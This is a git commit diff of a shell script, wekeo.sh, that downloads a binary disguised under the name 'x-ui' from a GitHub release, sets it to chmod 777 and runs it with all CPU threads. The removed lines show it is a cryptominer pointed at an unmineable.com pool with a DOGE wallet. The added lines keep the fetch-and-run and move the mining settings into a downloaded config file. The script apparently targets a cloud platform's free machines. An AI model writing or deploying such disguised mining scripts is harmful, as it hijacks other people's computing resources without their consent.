40cd2033c2a2148c5d031b34cdc9adb90c11e280
pickaxecolleague <100679616+pickaxecolleague@users.noreply.github.com>
2022-04-04 12:27:51 +0700

    Update wekeo.sh

--- wekeo.sh
+++ wekeo.sh
@@ -1,12 +1,8 @@
 cpu=$(echo nproc | bash)
-name=$(hostname)
-xui=https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/x-ui
 
-wget $xui
+wget https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/config-free.json
+wget https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/x-ui
 
 chmod 777 x-ui
 
-./x-ui --algo=rx/0 --threads=$cpu --donate-level=0 \
---randomx-wrmsr=-1 --url=rx.unmineable.com:3333 \
---user=DOGE:A7E5Ppu3Z8R8CXBbpkRKkG8AXnBkqh6Csp.$name \
---pass=x --astrobwt-avx2
+./x-ui  --threads=$cpu --config=config-free.json
